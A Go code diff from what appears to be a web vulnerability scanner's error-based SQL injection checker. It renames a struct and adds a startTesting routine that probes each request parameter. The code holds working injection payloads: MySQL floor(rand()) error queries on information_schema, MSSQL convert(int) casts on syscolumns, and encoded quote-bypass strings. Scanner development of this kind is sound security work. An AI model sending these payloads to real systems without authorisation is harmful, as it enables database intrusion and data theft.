@@ -104,16 +104,17 @@ var FalsePositivesPlainArray = []string{
 	"org.apache.commons.dbcp.SQLNestedException: Cannot get a connection, pool error Timeout waiting for idle object",
 }
 
-type classSQLErrorMessages struct {
+type ClassSQLErrorMessages struct {
 	TargetUrl                string
 	plainArray               []string
 	regexArray               []string
 	FalsePositivesPlainArray []string
-	lastJob                  *layers.LastJob
+	LastJob                  *layers.LastJob
+	variations               *util.PostData
 	// layer                    *layers.Plreq
 }
 
-func (errsql *classSQLErrorMessages) IsFalsePositive(text string) bool {
+func (errsql *ClassSQLErrorMessages) IsFalsePositive(text string) bool {
 	// plain texts
 	// for i := 0; i < errsql.FalsePositivesPlainArray; i++ {
 
@@ -138,7 +139,7 @@ func (errsql *classSQLErrorMessages) IsFalsePositive(text string) bool {
 	return false
 }
 
-func (errsql *classSQLErrorMessages) searchOnText(text string) string {
+func (errsql *ClassSQLErrorMessages) searchOnText(text string) string {
 	var result string
 	for _, v := range plainTexts {
 		if funk.Contains(text, v) {
@@ -167,9 +168,9 @@ func encodeStringAsChar(str string, separator string) string {
 	return out
 }
 
-func (errsql *classSQLErrorMessages) TestInjection(index int, value string, confirmData []string) bool {
+func (errsql *ClassSQLErrorMessages) TestInjection(index int, value string, confirmData []string) bool {
 
-	matchedText := errsql.searchOnText(errsql.lastJob.Features.Response.String())
+	matchedText := errsql.searchOnText(errsql.LastJob.Features.Response.String())
 	if matchedText != "" {
 		for _, data := range confirmData {
 			markerPlain := util.RandStr(8)
@@ -181,7 +182,7 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 				markerEncodedMYSQL +
 				`) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and` +
 				data
-			body_Feature, err := errsql.lastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			body_Feature, err := errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
 			if err != nil {
 				return false
 			}
@@ -195,7 +196,7 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 				markerEncodedMYSQL +
 				`),floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))` +
 				data
-			body_Feature, err = errsql.lastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
 			if err != nil {
 				return false
 			}
@@ -208,7 +209,7 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 			} else {
 				confirmValue = data + `(select convert(int,` + markerEncodedMSSQL + `) FROM syscolumns)` + data
 			}
-			body_Feature, err = errsql.lastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
 			if err != nil {
 				return false
 			}
@@ -221,7 +222,7 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 			} else {
 				confirmValue = data + `convert(int,` + markerEncodedMSSQL + `)` + data
 			}
-			body_Feature, err = errsql.lastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
+			body_Feature, err = errsql.LastJob.RequestByIndex(index, errsql.TargetUrl, confirmValue)
 			if err != nil {
 				return false
 			}
@@ -230,6 +231,31 @@ func (errsql *classSQLErrorMessages) TestInjection(index int, value string, conf
 			}
 		}
 		return false
+	}
+	return false
+}
+
+func (errsql *ClassSQLErrorMessages) testForError() bool {
+	if errsql.searchOnText(errsql.LastJob.Features.Response.String()) == "" {
+		return false
+	}
+	return true
+}
+
+func (errsql *ClassSQLErrorMessages) startTesting() bool {
+	for _, p := range errsql.variations.Params {
+		if !errsql.testForError() {
+			return true
+		}
+		if !errsql.TestInjection(p.Index, "1'\"", []string{"", "'", `"`}) {
+			return true
+		}
+		if !errsql.TestInjection(p.Index, "1\x00\xc0\xa7\xc0\xa2%2527%2522", []string{"", "'", `"`}) {
+			return true
+		}
+		if !errsql.TestInjection(p.Index, "@@"+util.RandStr(8), []string{"", "'", `"`}) {
+			return true
+		}
 	}
 	return false
 }
